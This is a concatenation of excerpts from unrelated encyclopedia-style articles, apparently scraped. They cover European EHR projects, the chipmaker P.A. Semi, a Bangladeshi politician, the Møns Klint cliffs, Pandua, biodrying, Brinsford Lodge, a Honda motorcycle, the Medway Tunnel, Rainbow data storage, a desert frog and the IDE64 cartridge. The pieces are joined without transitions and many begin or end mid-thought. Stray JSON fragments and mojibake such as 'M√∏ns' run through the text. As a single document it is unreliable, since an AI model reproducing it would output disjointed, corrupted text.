Validation of the Guidelines. Resources for EHR Interoperability *Producing a register for Conformance Criteria and Guidance Documents for obtaining EHR Certification; *Establishing EHR Archetypes guidelines and inventory; *Establishing a registration process for Coding Schemes in Europe (as mandated by CEN/TC 251); *Providing relevant EHR related standards inventory; Benchmarking Services *Defining services that uses benchmarking for Manual for Quality Labelling and Certification; *Preparing the Business Plan for new EHR- Certification related Services This project was done with EuroRec institute whose mission was to promote high quality EHRs throughout Europe. Through its networks and its centres acting as platforms along with the collaboration with eHealth ERA consortium and European Health Care Authorities (HCA)/ Ministries groups, EuroRec has provided various methods in assessing the needs and optimal choice methods for quality labelling and certification of EHRs. RIDE: A Roadmap for Interoperability of eHealth Systems in Support of COM 356 with Special Emphasis on Semantic Interoperability RIDE is a project that aims to provide a solid foundation for the action plans of eHealth Communication COM 356. It begun on 01/01/06 and ended on 31/12/07. Through research and development into the interoperability of eHealth systems, meaningful recommendations can be made for actions at a European level. The lack of complete harmonisation between clinical practice, terminology and EHR systems have highlighted that there is an unrealistic expectation in developing a single universally clinical data model. Hence the RIDE project objective is to provide a roadmap through focusing on current limitations of policies and strategies in solutions for ehealth interoperability and assessing health's European best practices in regards to providing semantic interoperability. EHR-IMPLEMENT: National policies for EHR Implementation in the European area: social and organizational issues The objective of EHR-IMPLEMENT is to provide best practice, policy and strategic recommendations in the implementation of EHR in Europe. This is done though the collection and analysis of EHR implementations in various countries. Previous EHR projects have always addressed the technological area in EHR. Other commonly overlooked in projects, the EHR-IMPLEMENT will focus the social and organisational on a broad national initiative, as these factor may potentially hinder, if not ruin the EHR implementation. This project comprised a case study approach and a focused survey at a European level. It aims to analyse and collect information on best practices and elaborate recommendations for policymakers to facilitate EHR into member states. According to EuroREC, these are the main objectives of the projects: *Analysis of national policies and strategies for the implementation of EHR *Conducting a survey regarding policy and action plans for National Implementation of EHR into Member States. *Investigating EHR users in the implementation process. *Raising issues of EHR implementation *Identifying best practices towards EHR implementation in Europe *Promoting information sharing and mutual learning through supporting the development of a community of scientific experts, technical personnel and National Health System representatives *Providing results and recommendations of the project amongst stakeholders across Europe See also * CEN/TC 251 * Canada Health Infoway * Centers for Medicare and Medicaid Services (USA) * Clinical Document Architecture (CDA) * Directorate- General for Information Society and Media (European Commission) * EHRcom * European Federation for Medical Informatics (EFMI) * European Health Telematics Association (EHTEL) * European Health Telematics Observatory (EHTO) * Health Informatics Service Architecture (HISA) * Health Insurance Portability and Accountability Act (HIPAA, USA) * Health Level 7 * International Classification of Primary Care (ICPC) * Kind Messages for Electronic Healthcare Record (KMEHR) * National Resource Center for Health Information Technology * openEHR Foundation References Sources * Iakovidis I, Purcarea O., eHealth in Europe: from Vision to Reality, Stud Health Technol Inform. 2008;134:163-8 * Richardson R., eHealth for Europe, Stud Health Technol Inform. 2003;96:151-6 External links * European Institute for Health Records * CEN/TC 125 (European Standardization of Health Informatics) * COM (2004) 356 final * Directorate H - ICT For Citizens and Businesses (Unit H1 - ICT for Health) Category:Electronic health records Category:Health and the European Union Category:Information technology organizations based in Europe Category:International medical associations of Europe ","title":"European Institute for Health Records"},{"id":"8098268","text":"'night, Mother is a 1986 American drama film starring Sissy Spacek and Anne Bancroft.

The company employed a 150-person engineering team which included people who had previously worked on processors like Itanium, Opteron and UltraSPARC. Apple Inc acquired P.A. Semi for $278 million in April 2008. History P. A. Semi concentrated on making powerful and power-efficient Power ISA processors called PWRficient, based on the PA6T processor core. The PA6T was the first Power ISA core to be designed from scratch outside the AIM alliance (i.e. not by Apple, IBM, or Motorola/Freescale) in ten years. Texas Instruments was one of the investors in P.A. Semi and it was suggested that their fabrication plants would be used to manufacture the PWRficient processors. PWRficient processors were shipping to select customers, and were set to be released for worldwide sale in Q4 2007. There were rumors that P. A. Semi had a relationship with Apple that suggested Apple would be the premier user of the PWRficient processors. That relationship supposedly ended with the Mac transition to Intel processors when Apple switched from the PowerPC to Intel's Core processors for their entire line of computers.  Acquisition by Apple  On 23 April 2008, Apple announced that they had acquired P. A. Semi. While Apple's previous relationship with P. A. Semi (see above) would indicate that Apple could use their processors, P. A. Semi manufactures only Power ISA processors, which Apple did not use at the time. At present, Apple only uses ARM and x86 processors. On 11 June 2008, during the annual Worldwide Developer's Conference, Apple CEO Steve Jobs said that the acquisition was meant to add the talent of P. A. Semi's engineers to Apple's workforce and help them build custom chips for the iPod, iPhone, and other future mobile devices such as the iPad. P.A. Semi has said that they were willing to supply their PWRficient PA6T-1682M chip on an end-of-life basis, if the Power ISA license that P.A.

Semi where the PA6T-1682M was the only one that became an actual product. PWRficient processors comply with the 64-bit Power ISA, and are designed for high performance and extreme power efficiency. The processors are highly modular and can be combined to multi-core system-on-a-chip designs, combining CPU, northbridge, and southbridge functionality on a single processor die. The PA6T was the first and only processor core from P.A. Semi, and it was offered in two distinct lines of products, 16xxM dual core processors and 13xxM/E single core processors. The PA6T lines differed in their L2 cache size, their memory controllers, their communication functionality, and their cryptography offloading features. At one time, P.A. Semi had plans to offer parts with up to 16 cores. The PA6T core is the first Power ISA core to be designed from scratch outside the AIM alliance (i.e. not designed by IBM, Motorola/Freescale, or Apple Inc.) in ten years. Since Texas Instruments was one of the investors in P.A. Semi, it was suggested that their fabrication plants would have been used to manufacture the PWRficient processors. PWRficient processors were initially shipped to select customers in February 2007 and were released for worldwide sale in Q4 2007. P.A. Semi was bought by Apple Inc. in April 2008, and closed down development of PWRficient architecture processors. However, it will continue to manufacture, sell and support these components for the foreseeable future due to an agreement with the US Government, as the processors are used in some military applications.

He opposed what he considered to be the repressive mentality of the Nurul Amin government towards the Bengali Language Movement despite being a member of the treasury bench. Early life He was born on 27 November 1900 in the Tarutia village situated in Ullapara of Sirajganj District. Political career Tarkabagish joined the Muslim League in 1936. From the party he participated in the election and earned his place in the Bengal Legislative Assembly in 1937 and in 1946. At the budget session of the East Bengal Legislative Assembly on the 21st of February 1952, Tarkabagish heavily criticized the killing of several protesters near Dhaka Medical College. Tarkabagish asked the leader of the house, Nurul Amin, to formulate an inquiry and to visit to the wounded students before proceeding the session. But as Amin refused the proposal, he walked out of the assembly and subsequently retired from Muslim League Parliamentary Party on February 23, 1952. He also expressed gratitude to the dead and wounded activists of the movement. Tarkabagish protested the police firing on and killing of students on 21 February 1952, in the assembly. He also made his speech in Bengali to respect his mother tongue and martyrs of the language movement. He was arrested on February 23 and kept in jail until June 1. Then he joined Awami Muslim League (now the Awami League) and was again elected a member of the assembly in 1954 from United Front. He was also elected as the member of the Constituent Assembly of Pakistan in 1956. Tarkabagish was elected as the acting president of the Awami League in 1957, and then the president of the Awami League from 1964, a position in which he served till 1967. After the independence of Bangladesh Tarkabagish presided over at the first session of the Jatiya Sangsad of Bangladesh in 1972. He was again elected a member from Awami League in 1973. After the assassinations of the founding father and then-President of Bangladesh, and almost his entire family and several relatives on August 15, 1975, by a group of military officers in an attempted coup, and subsequent coups and countercoups, Tarkabagish himself formed a party named Gano Azadi League in 1976. During the regime of Ershad he played a role in the formation and activities of 15 party alliance that took part in the movement against Ershad. Death and legacy Tarkabagish died in Dhaka on 20 August 1986. He was honored with an Independence Day Award in 2000.  Controversy  After the assassination of Mujibur Rahman, Tarkabagish went against his former comrade and praised the mastermind of the assassination Khondaker Mostaq Ahmad saying, \\"May Allah bless the President [Moshtaque] in establishing rule of law, peace and happiness in the country by uprooting corruption.\\" References Citations * Category:1900 births Category:1986 deaths Category:Awami League politicians Category:Recipients of the Independence Day Award Category:Pakistan Muslim League politicians Category:Presidents of the Awami League Category:1st Jatiya Sangsad members Category:Pakistani MNAs 1955‚Äì1958 ","title":"Abdur Rashid Tarkabagish"},{"id":"8098302","text":"Jean Boudreau (1748 - August 31, 1827) was a political figure in Lower Canada.

Some of the cliffs fall a sheer 120 m to the sea below. The highest cliff is , which is 128 m above sea level. The area around M√∏ns Klint consists of woodlands, pastures, ponds and steep hills, including Aborrebjerg which, with a height of 143 m, is one of the highest points in Denmark. The cliffs and adjacent park are now protected as a nature reserve. M√∏ns Klint receives around 250,000 visitors a year. There are clearly marked paths for walkers, riders and cyclists. The path along the cliff tops leads to steps down to the shore in several locations. On 29 May 2007, close to the cliff tops, the GeoCenter M√∏ns Klint was opened by Queen Margrethe. The geological museum with interactive computer displays and a variety of attractions for children traces the geological prehistory of Denmark and the formation of the chalk cliffs. The museum was designed by PLH Architects, the winners of an international design competition. Geology M√∏ns Klint - after the 2007 Store Taler landslide The chalk forming the cliffs consists of the remains of shells from millions of microscopic creatures (coccolithophores) which lived on the seabed over 70 million years ago. As a result of huge pressure from glaciers moving west, the terrain was compacted and pushed upwards, forming a number of hills and folds. When the ice melted at the end of the last ice age about 11,000 years ago, the cliffs emerged. They form part of the same deposits as the cliffs of R√ºgen, Germany, on the other side of the Baltic. Today, it is possible to find fossils of various types of shellfish as the sea continues to erode the chalk. Erosion also caused one of the highest points on the cliffs, the \\"Sommerspiret\\", to fall into the sea in 1998, and in January 2007, there was an even larger landslide around the Store Taler, in the northern part of the cliffs, creating a 300-m long peninsula of chalk and fallen trees stretching out into the sea below. Nature M√∏ns Klint: a pond in the Klinteskov woods Because of the special nature of the chalky soil, there are many rare plants in the area, particularly several varieties of orchid which are at their best in early summer. In particular, the tall lady orchid (Orchis purpurea) grows under the staircases leading down to the beach. The chalk also provides a distinctive light green tint to the beech trees along the top of the cliffs, maintaining their spring hues throughout the summer season. In the hilly park which stretches a couple of kilometers inland, there are a number of ponds and marshes, many populated by trees. Several signposted circuits provide opportunities for walkers, riders and cyclists to discover the surroundings. Beech trees along staircase In recent years, the peregrine falcon, the fastest of all birds as it swoops down to its prey at 350 km/h, has been observed breeding on M√∏ns Klint.Photo of Peregrine Falcon on M√∏ns Klint by Per Schmiermacher-Hansen, June 2003. And the extremely rare large blue butterfly (Maculinea arion) can also be found in the area. Points of interest Liselund Park, at the northern end of the cliffs, is an attractive combination of small houses, ponds and rolling lawns built by Antoine de la Calmette for his wife Elisabeth or Lise at the end of the 18th century. Liselund: The manor house Klintholm Estate, , to the west of the wooded area along the cliffs, is a collection of old farm buildings dating back to 1780 and a large park. The manor house which used to form part of the estate was demolished in 2000 as a result of dry rot. The GeoCenter M√∏ns Klint is a geological museum close to the top of the chalk cliffs. The museum explains the geology of the chalk cliffs and has exhibitions on the fossils found in the chalk. Near the museum start several walks to the cliffs, including two spectacular stairways from the top of the cliff to the beach. Access M√∏ns Klint can be reached by road either directly from Stege or from Klintholm Havn. In the summer, there is a regular bus service. Accommodation is available within the cliff area itself or in hotels and pensions in the vicinity. There is a camping site close to the main entrance to the park and a youth hostel nearby. M√∏ns Klint in art M√∏ns Klint has been a popular subject for landscape painters, especially during the Danish Golden Age when the national romanticism movement encouraged artists to take renewed interest in the Danish countryside.

It has an average elevation of 19 metres (62 feet). Pandua, Purusattompur and Namajgram form a cluster of census towns. Pandua CD block is a flat alluvial plain, known as the Hooghly-Damodar Plain, that forms part of the Gangetic Delta. The place is best known for its minar and the ruins of Pandu Raja's Palace where all important state ceremonies were held. The 13th century minar soars to a height of 125 feet. Minars and Minarettes of India History According to Binoy Ghosh, the tall Pandua minar can be seen by those travelling in trains or along the Grand Trunk Road. It is locally said that Shah Sufiuddin defeated the Hindu king of the Pandua and Mahanad area and built this victory pillar. Mahiuddin Ostagar of Santipur composed a poem, Panduar Kechha, in which he describes how Muslim domination of the area was achieved. There was a king named Pandu in Pandua. Inside his palace there was a well blessed by the gods. When the body of a dead person was immersed in its waters, the person regained life. During the reign of king Pandu, mostly Hindus lived in Pandua, and there were a few Muslims. One day a Muslim peasant killed a cow on his son‚Äôs birthday. This enraged the Hindus and they killed the son. The Muslim peasant complained to king Pandu but he did not take any action. The peasant carried the dead body of his son to the Badshah at Delhi, Feroze Shah. After listening to the complaint, he sent his nephew, Shah Sufi, at the head of an army, to Pandua. He waged war but initially he was unsuccessful, because of the life- giving properties of the divine well. Frustrated Shah Sufi was almost on the verge of returning to Delhi, when a cowherd boy revealed the secret of the divine well to Shah Sufi. The boy, dressed as a yogi, entered the palace and threw some beef into the well, thereby destroying its divine properties. The Muslim forces captured Pandua, and Shah Sufi remained back in Pandua. He built a large mosque there.Ghosh, Binoy, Paschim Banger Sanskriti, , part II, 1976 edition, pages 312-316 , Prakash Bhaban, Kolkata. Historically, there is no evidence of the existence of king Pandu, but there were many minor Hindu kings in the Saptagram-Pandua area. Within a century of Bakhtiyar Khilji‚Äôs conquest, the Muslim thrust into the southern parts of the Rarh region, that included present-day Hooghy district, started from the end of the 13th century to the 14th century. It was during the rule of the Balban sultans in Delhi (1286-1328) that the efforts were made to establish Islam, not only by capturing the thrones and political power, but also establish Islam socially. Their modus operandi was ‚Äúto enter the territory of the Hindu rajas as squatters on some prtext or other. Then they would bring down the regular army of the Muslim State upon these infidel kings to punish them for infringing the rights of Mussalmans.‚ÄùThe author has quoted from History of Bengal, Dacca University, Vol II, p. 69 According to the available records, Zafar Khan had come to the Tribeni area towards the end of the 13th century and Shah Sufiuddin had come to the Pandua area towards the beginning of the 14th century. During the period that followed Muslim Ghazis built many mosques and tombs on the ruins of Hindu temples. There is tell-tale evidence of the historical role of Muslim Ghazi-Pirs in the Pandua-Mahanad-Tribeni area. The Shrikkhala Devi Shrine as a Shakti Peeth The mythology of Daksha yaga and Sati's self immolation had immense significance in shaping the ancient Sanskrit literature and even had impact on the culture of India. It led to the development of the concept of Shakti Peethas and there by strengthening Shaktism. Enormous mythological stories in puranas took the Daksha yaga as the reason for its origin. It is an important incident in Shaivism resulting in the emergence of Shree Parvati in the place of Sati Devi and making Shiva a grihastashrami (house holder) leading to the origin of Ganapathy and Subrahmanya. Shakti Peethas are shrines or divine places of the Mother Goddess. These are places that are believes to have enshrined with the presence of Shakti due to the falling of body parts of the corpse of Sati Devi, when Lord Shiva carried it and wandered throughout Aryavartha in sorrow. There are 51 Shakti Peeth linking to the 51 alphabets in Sanskrit. Note: The lists of shrines provided in the linked articles does not mention any shaktipeeth in the Pandua area and no references are there to show the existence of a shakti peeth at/around Pandua.

In biodrying processes, the drying rates are augmented by biological heat in addition to forced aeration. The major portion of biological heat, naturally available through the aerobic degradation of organic matter, is utilized to evaporate surface and bound water associated with the mixed sludge. This heat generation assists in reducing the moisture content of the biomass without the need for supplementary fossil fuels, and with minimal electricity consumption. It can take as little as 8 days to dry waste in this manner. This enables reduced costs of disposal if landfill is charged on a cost per tonne basis. Biodrying may be used as part of the production process for refuse-derived fuels. Biodrying does not however greatly affect the biodegradability of the waste and hence is not stabilised. Biodried waste will still break down in a landfill to produce landfill gas and hence potentially contribute to climate change. In the UK this waste will still impact upon councils LATS allowances. Whilst biodrying is increasingly applied within commercial mechanical biological treatment (MBT) plants, it is also still subject to on-going research and development.

His MSc was in International Relations from the London School of Economics and Political Science. He married Nicole Helari, and they had three grown children. Wilson became acknowledged as the leading authority on T. E. Lawrence,Michael Korda, \\"Hero: The Life and Legend of Lawrence of Arabia\\", J R Books 2011, pp 694‚Äì695 and was the author of Lawrence of Arabia: The Authorised Biography of T. E. Lawrence (1989). Wilson's first published work on Lawrence was an edition in 1971 of Lawrence's commonplace book, Minorities; Good Poems by Small Poets and Small Poems by Good Poets; of which his well-researched introduction gives readers an understanding of how the poems reflected Lawrence's life and thoughts. In 1975, as a result of the success of Minorities, A. W. Lawrence appointed Wilson to be the authorised biographer of T. E. Lawrence. Wilson spent years of research, accumulating considerably more information about Lawrence than had been published before. To make information about Lawrence freely available worldwide, Wilson developed T. E. Lawrence Studies, a website and online discussion list. Since 1990 through Castle Hill Press he and his wife have edited and published scholarly editions of Lawrence's works and correspondence and works about Lawrence's life. Wilson was consultant to the National Portrait Gallery for their Lawrence of Arabia Centenary Exhibition (1988-1989) and compiled the exhibition catalogue. He was one of the two historical advisers in 2005-2006 to the Imperial War Museum for the exhibition \\"T. E. Lawrence, the life, the legend\\". Wilson gave numerous papers on Lawrence, including \\"T. E. Lawrence and the capture of Akaba\\" (Australian War Memorial, Canberra, December 2007); \\"Victoria Ocampo, T. E.

Prior to that it was a Teacher Training College for Malaysian students and, during the Second World War, a hostel for employees at a nearby armaments factory. It was located on the outskirts of the Staffordshire village of Featherstone, about 5 miles north of Wolverhampton. The early years (1941 - 1955) The site came into existence around 1941 when an armaments factory was built on a greenfield site to the north of Moseley Old Hall, to manufacture armour piercing shells. The site was in two parts with Hard Metal Tools Ltd (which became Royal Ordnance Speciality Metals) producing tungsten carbide heads,AccessMyLibrary.

A huge chunk of history is missing from this article, between 1948 and 1954 Brinsford lodge hostel was used to house displaced persons and political exiles. Daily buses took them to work at Cortauld's in Wolverhampton ( a maroon coloured AEC ) and at Sankey's steel works in Bilston ( a yellow and black Bedford ). Many of the temporary residents are still alive and living in the area. There are many stories they could tell and photos they could share. It just needs a local historian to do the job. There was a tragic event in 1961 or 62 while it was a college for Malayan students. There was a fire and three girl students died. The Express & Star should have it in its archives. Andrew Biswell recounts in his biography of Anthony Burgess, The Real Life of Anthony Burgess (page 117) that the novelist lectured at Brinsford Lodge in 1946-47. Working under the aegis of Birmingham University, Burgess taught various courses at the lodge including history, politics and literature to demobilized soldiers to prepare them for life as civilians. The lodge was at that time an all-male residential college. Burgess‚Äôs employer was the Central Council for Adult Education in His Majesty‚Äôs Forces, Biswell notes. Malayan Teacher Training (MTT) College (1955 - 1964) In the early 1950s, the Federation of Malaya was in the process of achieving independence from the United Kingdom and, at that time, schools in Malaya were staffed predominantly by expatriate British teachers. In order to assist Malaya in becoming self-sufficient in teaching staff after independence, Brinsford Lodge was offered to the Malaysian government as a Teacher Training College.Moore, Richard. 26 May 2001. Interview with Luke Teoh, retrieved on 23 November 2006. The college opened in 1955. The courses taught there lasted for two years. There were up to 300 students - 150 juniors and 150 seniors ‚Äì on site at any one time and the last cohort left the college in 1964. The buildings were used for administration, teaching or living accommodation (known as houses). Teaching accommodation was identified by its function (for example: Classroom, Tutorial), and the houses were identified by letters of the alphabet (for example: J House). There is a Brinsford Alumni association based in Kuala Lumpur. Wolverhampton Polytechnic Halls of Residence (1964 - 1982) Following the closure of the MTT, Brinsford Lodge became the Halls of Residence for Wolverhampton Polytechnic, providing single-occupancy study/bedrooms for up to 250 students. The site retained its existing catering facility and consequently offered half-board accommodation. The houses continued to be used for accommodation and were renamed as 'blocks' (for example: J Block). The teaching buildings were also turned into accommodation, and retained their previous naming convention suffixed with 'block'. The names were abbreviated in day-to-day usage, so that people were now living in CR (Classroom), Tut (Tutorial), Geog (Geography), etc. blocks, but there was no longer any association between the names and their original function. Each block held around a dozen students and, in addition to the study/bedrooms and bathrooms, provided minimal cooking and clothes-washing facilities. Pairs of rooms from the MTT rooms were joined together and alternate doorways sealed over, giving larger single rooms for Polytechnic students. The main disadvantage of the site was that its distance from the town centre meant daily coach services were needed to transport students to and from the main campus in the centre of Wolverhampton. Part-way through the 1973-4 academic year the Polytechnic opened a newly constructed self-catering hall (Randall Lines) near the Wolverhampton Wanderers football ground, in Wolverhampton town centre. This building was within walking distance of the main campus and its proximity had clear benefits regarding transport and easier access to the polytechnic facilities. Further halls of residence have since been opened.University of Wolverhampton website Halls of residence, retrieved on 23 November 2006 Brinsford Lodge closed as a Hall of Residence in 1982. Without the drying effect of the heating system the buildings deteriorated rapidly, and they were demolished within a couple of years. As at November 2010, the site remains undeveloped.

Borrowing design cues from the existing XL1000V Varadero, Honda set about developing a bike that offered substantially bigger proportions than most 125 cc motorcycles, with a seat height of , ensuring that the rider would gain not only a commanding road view but also ensure the motorcycle was capable of offering genuine pillion access. The XL125V had a fuel capacity of , which included a 2-litre reserve ‚Äì larger than most other 125 cc motorcycles.225x225px Following the cues taken from the XL1000V Varadero, Honda chose to power the new model with the 124 cc 4-stroke SOHC 4v 90¬∞ V-twin engine that was originally developed for the VT125C Shadow cruiser motorcycle. The engine developed the new maximum allowed by the new restriction, as well as of torque. The new bike was fuelled through carburetors. The Varadero 125 engine revs to over 12,000 rpm; higher than most V-twin engines. It develops peak power at around 11,000 rpm, while in contrast its stablemate, the XL1000V Varadero, peaks its power at 6,000 rpm. The engine sat in an all-new tubular steel frame designed for the new model, however the cast aluminium box-section swing arm was taken from the XL650V Transalp motorcycle (as was the rear luggage rack) and equipped with mono-shock rear suspension that provides of travel. Front suspension is provided by 35 mm forks, also with 150 mm of travel. The Varadero 125 was released with some fanfare, with Honda calling it the \\"new flagship of Honda's diverse 125 lineup\\" in the press information. There were also plenty of positive reviews of the new model, with most only citing the high price as the only criticism. The new Varadero 125 reportedly sold well with MCN reporting in January 2002 that it had sold over 380 units, roughly the same as its two bigger stablemates the XL1000V Varadero and the XL650V Transalp. In 2003 the XL125V Varadero was given a minor facelift. The main being the three spoke, cast aluminium wheels being changed from black to silver in colour. Since 2007 After the introduction of the Euro III Emission standards, the XL125V Varadero would either have needed to be withdrawn from production or modified. In 2007, Honda elected to continue with the model and so developed a new electronic fuel injection system based on the PGM-FI system used by other Honda motorcycles. At this time Honda also decided to bring about a major restyle to bring the model in line with company appearance trends at the time. The changes included a restyled front fairing which includes wind screen, indicators and headlight, an all new dashboard which now included a fuel reserve warning light and new fairing mounted wing mirrors, previously handlebar mounted. Mechanically, the 2007 XL125V Varadero is similar to the previous model with the engine, gearbox, swing arm and rear suspension, luggage rack and steering all interchangeable as well as parts such as starter-motors, spark plugs and brakes also being interchangeable. However, the air intake has been turned through 90 degrees to be front facing and the fuel tank capacity has been reduced slightly to accommodate the new fuel injection system and ECU control unit. The fuel tank is around 0.5 litres smaller at . To enable the bike to meet the new emission standards, the engine is now fuel-injected, is slightly de-tuned and has a catalytic converter.

It forms part of the A289 Medway Towns Northern Relief Road. The Medway Tunnel is the first immersed tube tunnel to be built in England and only the second of this type in the UK, the other at Conwy, North Wales.  History   Development  The Rochester Bridge had been the lowest river crossing of the River Medway for centuries, and despite expansion in the 1970s was very congested. In the late 1980s, the Medway Tunnel was proposed downstream of the Bridge to relieve congestion on the bridge, to allow greater access to the Medway Towns and assist with redevelopment of Chatham Dockyard. The Medway Tunnel Bill - promoted by the Rochester Bridge Trust - was submitted to Parliament in 1988. In 1990 the Medway Tunnel Act was passed granting the Rochester Bridge Trust the power to build and own the tunnel.Rochester Bridge Trust Construction The ¬£80m project was carried out by an HBM Civil Engineering / Tarmac Construction joint venture, and started in May 1992. The tunnel itself was constructed in three distinct sections. The central part of the tunnel is the of immersed tube, which is linked to cut and cover tunnels on both the Strood and Chatham banks of the river, with a total tunnel length of . As part of the construction project, 800m of new dual carriageway and a new junction was built to connect the new tunnel to the existing road network. Separate from the project, various bypasses and link roads were constructed to provide access to the local area - the A289 Medway Northern Relief Road. The Medway Tunnel was officially opened by the Princess Royal on 12 June 1996. In 1996, it won an award from the UK's Concrete Society. Running costs In 2008 negotiations were completed by Medway Council which purchased the freehold of the tunnel from the Trust for ¬£1 with a ¬£3.6m contribution on future costs. Cyclists are currently not allowed to travel through the tunnel which is not part of the local cycle network.

A. Siraj, ArabNews (published November 18, 2006; accessed November 29, 2006) Abideen received his MCA from MES Engineering College Kuttipuram in Kerala's Malappuram District . Initial newspaper reports of the technology were disputed by multiple technical sources, although Abideen says those reports were based on a misunderstanding of the technology. The paper meant to demonstrate the capability of storing relatively large amounts of data (and not necessarily in the gigabyte range) using textures and diagrams.Paper storage man misunderstood -- The Inquirer article, 12 December 2006 (retrieved 15 December 2006. The Rainbow data storage technology claims to use geometric shapes such as triangles, circles and squares of various colors to store a large amount of data on ordinary paper or plastic surfaces. This would provide several advantages over current forms of optical- or magnetic data storage like less environmental pollution due to the biodegradability of paper, low cost and high capacity. Data could be stored on \\"Rainbow Versatile Disk\\" (RVD) or plastic/paper cards of any form factor (like SIM cards).\\"Store 256GB on an A4 sheet\\" by Chris Mellor, Techworld (published November 24, 2006; accessed November 29, 2006) Criticism Following the wide media attention this news received, some of the claims have been disputed by various experts.IT Soup: Scam of Indian student developing technology to store 450 GB of data on a sheet of paper By ITSoup (published November 25, 2006; accessed November 25, 2006) \\"Can you get 256GB on an A4 sheet? No way!\\" By Chris Mellor, Techworld (published November 24, 2006; accessed November 29, 2006) Printing at 1,200 dots per inch (DPI) leads to a theoretical maximum of 1,440,000 colored dots per square inch. If a scanner can reliably distinguish between 256 unique colors (thus encoding one byte per dot), the maximum possible storage is approximately 140 megabytes for a sheet of A4 paper-much lower when the necessary error correction is employed. If the scanner were able to accurately distinguish between 16,777,216 colors (24 bits, or 3 bytes per dot), the capacity would triple, but it still falls well below the media stories' claims of several hundred gigabytes. Printing this quantity of unique colors would require specialized equipment to generate many spot colors. The process color model used by most printers provides only four colors, with additional colors simulated by a halftone pattern. At least one of three things must be true for the claim to be valid: * The paper must be printed and scanned at a much higher resolution than 1,200 DPI, * the printer and scanner must be able to accurately produce and distinguish between an extraordinary number of distinct color values, or * the compression scheme must be a revolutionary lossless compression algorithm. The theory is: If Rainbow's \\"geometric\\" algorithm is to be encoded and decoded by a computer, it would equally viable to store the compressed data on a conventional disk rather than printing it to paper or other non-digital medium. Printing something as dots on a page rather than bits on a disk will not change the underlying compression ratio, so a lossless compression algorithm that could store 250 gigabytes within a few hundred megabytes of data would be revolutionary indeed. Likewise, data can be compressed with any algorithm and subsequently printed to paper as colored dots. The amount of data that can be reliably stored in this way is limited by the printer and scanner, as described above. However Sainul Abideen says that the articles are based on misunderstandings. He claims, it as a method to store data in the form of colour, in any medium where colour can be represented, not only paper. Density of storage in paper will be very small and the density will be depends on the storage medium, capacity of colour representation and retrieval methods etc. Demonstrations Sainul Abdeen demonstrated his technology to the college and members of the Indian press in the MES College of Engineering computer lab, Kerala, and was able to compress 450 sheets plain text from foolscap paper into a 1-inch square. He also demonstrated a 45-second audio clip compressed using this technology on to an A4 sheet. Depending on the sampling frequency, bit depth, and audio compression (if any), a 45-second audio clip can consist of anywhere from a few kilobytes to a few megabytes of data. Abideen claimed that the technology could be extended to 250 gigabytes by using specific materials and devices. This technology is based on two principles: ;Principle I :‚ÄúEvery color or color combinations can be converted into some values and from the values the colors or color combinations can be regenerated‚Äù. ;Principle II :‚ÄúEvery different color or color combinations will produce different values‚Äù. References Absolute Rainbow Dots Absolute rainbow dots are used to detect errors caused by scratches, and whether any fading has occurred. Absolute rainbow dots are predefined dots carrying a unique value. These dots can be inserted in the rainbow picture in pre- specified areas. If fading occurs these dot values will change accordingly, and at the reproduction stage this can be checked and corrected. Absolute rainbow dots will be microscopically small so that they occupy very little space in the rainbow picture. These will be colored differently so that each dot will have its own fixed unique value.

The trilling frog or desert trilling frog (Neobatrachus centralis) is an Australian burrowing frog, of the family Myobatrachidae. Distribution The trilling frog is found throughout the central Australian deserts in a band encompassing South Australia and Western Australia. It is remarkable in its toleration for arid environments. Description The trilling frog is a medium-sized short, fat frog (5 centimetres measured from snout to posterior), usually of a brown and tan colour with sharply differentiated mottling, much like army desert camouflage. This frog is white underneath. The pupil of this frog contracts to a vertical slit. The dorsal surface is usually smooth, however it is reported that during the breeding season, the males develop fine, dark bristles on their back. The trilling frog can be differentiated from the painted frog (Neobatrachus pictus) by the 'baggy pants' of loose skin that extends almost to their knees when the hind legs are extended Ecology and behaviour The trilling frog is adapted to desert conditions and can spend years without having to surface, buried deep underground with their glands under the skin full of water. Trilling frogs will commonly dig themselves to the surface at the beginning of the late summer rains. There are stories that to prevent death by thirst, Indigenous Australians could catch these frogs by cleverly stamping on the right patch of ground to simulate thunder or falling rain, causing the frogs to surface where they could then be made to give up their stored moisture. These frogs will spend a few weeks calling nightly while floating in or sitting at the edge of rainwater filled claypans, puddles and waterholes. DEH, Trilling Frog Call They eat the numerous insects accompanying the rains and lay eggs in drawn out clumps, often wrapped around snags in the water. The tadpoles mature very quickly. Like most Australian frogs, the trilling frog is an opportunistic predator and so the diet of the species consists mostly of any desert dwelling insects and reptiles small enough to fit in its mouth. In some areas it is the only ground living vertebrate collected. Genetics This interesting little frog is a tetraploid organism, having double the normal number of chromosomes. Recently results of molecular biology analysis have caused some speculation that this may be the same species as Neobatrachus sudelli (Roberts (1997)) References * Database entry includes a range map and justification for why this species is of least concern *Cogger, H.G. 1979.

Today Josef Soucek is working on the design. *IDE64 v1.1 ‚Äì In 1997 the first public version of the cartridge appeared. The logic was fitted into 2 ispLSIs, the operating system was burned into a 32 kB EPROM, and there was 16 kB of RAM storage for buffers. There was a DS1302 real-time clock included which could keep the settings and hold the time backed by a battery. Beside the parallel ATA connector also an expansion port pass through was included to allow attaching of other cartridges. *IDE64 v2.1 ‚Äì Around 1999 the first \\"modern\\" version of the cartridge came out, merging the logic into one big ispLSI PLD. Also the EPROM was upgraded to a 64 kB EEPROM to allow operating system upgrades without special equipment. The RAM was extended to hold 28 kB of buffers and internal variables. There was a new connector on board, called ShortBus. It was meant for hardware expansions like LCD displays,LCD display driver source 7-segment display,Hexcard for IDE64 but later also more sophisticated expansions appeared. This was also the first version to include SuperCPU compatibility. *IDE64 v3.1 ‚ÄìIn 2001 a redesigned version of the 2.1 cartridge was made, this version drops the expansion port pass-through. *IDE64 v3.4 ‚ÄìCompactFlash cards became popular, so the cartridge was redesigned in 2004 to include a CF socket. This allowed a mobile and small storage possibility for the C64, without additional devices and power supplies. *IDE64 v3.4+ ‚Äì In 2005, with a small hardware change, the EEPROM was upgraded to 128 kB, which allowed to hold two versions of the operating system for both a standard C64 and SuperCPU. This was selectable with a small switch, and solved the reflashing problem for those with SuperCPU equipped systems. *IDE64 v4.1 ‚Äì The pre-release happened in 2008 August,√Årok Party 2008 szerzem√©nyek #2 - avagy Agyament Hardverek #1 (Hungarian) but it was not available until 2009 March. The hardware was redesigned to use surface-mounted parts and a more up- to-date ispMACH CPLD, which resulted in a much shorter board. A USB serial FIFO chip was added for fast PCLink connections, and an Amiga clock-port for connecting additional devices. The card slot on this version is separated from the parallel ATA port, and offers wider compatibility with CF cards.

